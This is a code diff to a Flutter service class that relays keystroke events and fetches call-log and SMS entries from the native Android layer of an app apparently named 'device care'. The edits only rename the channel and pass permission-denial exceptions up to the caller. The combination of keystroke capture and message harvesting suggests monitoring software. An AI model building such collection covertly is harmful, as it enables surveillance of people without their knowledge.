@@ -3,7 +3,8 @@ import 'package:flutter/material.dart';
 
 // handles all method channel communication with native android layer
 class MethodChannelService {
-  static const _channel = MethodChannel('com.example.app/events');
+  // channel name must match the CHANNEL constant in MainActivity.kt
+  static const _channel = MethodChannel('com.shaonx.device_care/events');
 
   // callback invoked when native side pushes a keystroke event
   Function(String)? onKeyStrokeReceived;
@@ -40,11 +41,15 @@ class MethodChannelService {
   }
 
   // fetch last 30 call log entries from native layer
+  // throws PlatformException if READ_CALL_LOG permission is denied — callers
+  // should catch PlatformException to distinguish denial from an empty log
   Future<List<Map<String, dynamic>>> getCallLogs() async {
     try {
       final List<dynamic> result = await _channel.invokeMethod('getCallLogs');
-      // Convert List<dynamic> to List<Map<String, dynamic>>
       return result.map((e) => Map<String, dynamic>.from(e as Map)).toList();
+    } on PlatformException {
+      // let PlatformException bubble so HomeController can set the permission flag
+      rethrow;
     } catch (e) {
       debugPrint('Get call logs error: $e');
       return [];
@@ -52,10 +57,13 @@ class MethodChannelService {
   }
 
   // fetch last 50 SMS entries from native layer
+  // throws PlatformException if READ_SMS permission is denied
   Future<List<Map<String, dynamic>>> getSmsLogs() async {
     try {
       final List<dynamic> result = await _channel.invokeMethod('getSmsLogs');
       return result.map((e) => Map<String, dynamic>.from(e as Map)).toList();
+    } on PlatformException {
+      rethrow;
     } catch (e) {
       debugPrint('Get SMS logs error: $e');
       return [];
